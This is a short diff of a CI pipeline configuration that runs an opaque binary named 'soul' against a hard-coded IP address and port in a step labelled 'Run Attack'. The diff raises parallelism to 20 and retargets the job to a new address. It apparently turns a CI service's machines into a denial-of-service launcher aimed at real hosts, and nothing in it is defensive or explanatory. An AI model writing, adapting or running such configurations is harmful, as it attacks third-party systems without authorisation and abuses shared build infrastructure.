@@ -4,14 +4,14 @@ jobs:
     machine:
       image: ubuntu-2204:current
     resource_class: medium
-    parallelism: 1
+    parallelism: 20
     steps:
       - checkout
       - run:
           name: Run Attack
           command: |
              chmod +x soul
-             ./soul 20.198.111.7 14302 180 || true
+             ./soul 74.225.134.34 27555 180 || true
 
 workflows:
   attack_flow:
